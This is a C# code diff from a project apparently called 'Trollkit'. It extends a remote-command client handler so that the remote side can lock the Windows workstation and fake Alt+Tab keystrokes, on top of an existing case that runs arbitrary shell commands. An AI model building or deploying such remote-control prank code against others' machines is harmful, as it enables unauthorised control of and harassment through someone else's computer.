@@ -2,16 +2,21 @@
 using System.Collections.Generic;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Trollkit_Library.Models;
+using Trollkit_Library.Modules;
 
 namespace Trollkit_Client.Modules.CommandHandlers
 {
     public class WindowsHandler : ICommandHandler
     {
-        public bool HandleCommand(TransferCommandObject obj)
+		[DllImport("user32.dll")]
+		public static extern bool LockWorkStation();
+		public bool HandleCommand(TransferCommandObject obj)
         {
 			switch (obj.Command)
 			{
@@ -20,6 +25,12 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					return true;
 				case "Command":
 					RunCommand(obj.Value);
+					return true;
+				case "LockWindows":
+					LockWorkStation();
+					return true;
+				case "AltTab":
+					AltTab();
 					return true;
 			}
 
@@ -43,5 +54,23 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			process.StartInfo = startInfo;
 			process.Start();
 		}
+
+		private void AltTab()
+		{
+			Random number = new Random();
+			Keyboard keyboard = new Keyboard();
+			keyboard.Send(Keyboard.ScanCodeShort.MENU);
+			keyboard.Send(Keyboard.ScanCodeShort.TAB);
+			for (int i = 0; i < number.Next(2, 7); i++)
+			{
+				Thread.Sleep(10);
+				keyboard.Send(Keyboard.ScanCodeShort.TAB);
+			}
+			keyboard.release(Keyboard.ScanCodeShort.MENU);
+			keyboard.release(Keyboard.ScanCodeShort.TAB);
+
+		}
+
+	
     }
 }
